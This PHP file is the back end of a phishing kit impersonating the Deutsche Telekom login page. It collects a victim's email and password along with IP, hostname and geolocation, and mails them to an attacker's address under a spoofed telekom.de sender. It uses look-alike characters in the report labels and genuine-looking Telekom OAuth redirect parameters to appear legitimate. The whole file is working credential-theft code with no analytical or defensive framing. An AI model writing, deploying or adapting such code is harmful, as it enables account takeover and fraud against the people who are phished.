<?php
error_reporting();
ob_start();
session_start();
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
       $region=$data['geoplugin_regionName'];
    $country=$data['geoplugin_countryName'];
    $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];
function generateCode($limit){
$code = '';
for($i = 0; $i < $limit; $i++) { $code .= mt_rand(0, 9); }
return $code;
}
function random_strings($length_of_string) {

    return substr(md5(time()), 0, $length_of_string);
}



/** form fields **/

$email = $_SESSION['email'];
$passwd = $_POST['pw_pwd'];
$wiz = $_POST['wiz'];
if ($wiz !== '') {
 
 die();
 
}else {

// pass valid/invalid emails
if (!filter_var($email, FILTER_VALIDATE_EMAIL)){
  $setback = "./";
  $argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=invalidemail";
   $uri1 = random_strings(10);
   $uri2 = generateCode(100);
  header("Location: $setback?$argument&sess=&$uri2");  
    }else {

//Add bad key minimizer
//include 'sanitize_password.php';

//Empty string catcher and key sanitizing
if($passwd ==""){
     
  $setback = "authword.php";
  $uri2 = generateCode(100);
  $argument = "$uri2=appsuite-saml-xm1&echo=$email&error=emptypass&goto=https://accounts.login.idm.telekom.com/oauth2/auth?scope=openid&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&response_type=code&redirect_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Fopenid_connect_login&state=36184e7e08e66&logout_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Flogout&nonce=563d9372867c&client_id=10LIVESAM30000004901AM200000000000000000";
  header("Location: $setback?$argument");  
 }
     else{
   
//including email to send   
include 'Email.php';   


//Arranging reports
$Hash = "==================|+$country+|==================
ß'Lðģɨŉ : $email
ß'qɐɔɔɰơɹŧ   : $passwd
============= [ Ip & Hostname Info ] =============
city:$city
Client IP: $ip
TimeStamp: $log_date 
Hostname: $hostname
-----------------+  +-----------------";

//Relaying...
$subject = "$email";
$headers = "From: telekom.de <service@privejets.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$Hash,$headers);



 
  $setback = "sso.php";
  $uri2 = generateCode(100);
  $args = base64_encode($email);
  header("Location: $setback?$uri2=$args");
  //session_destroy();
 
 




  }
 
 }
}
?>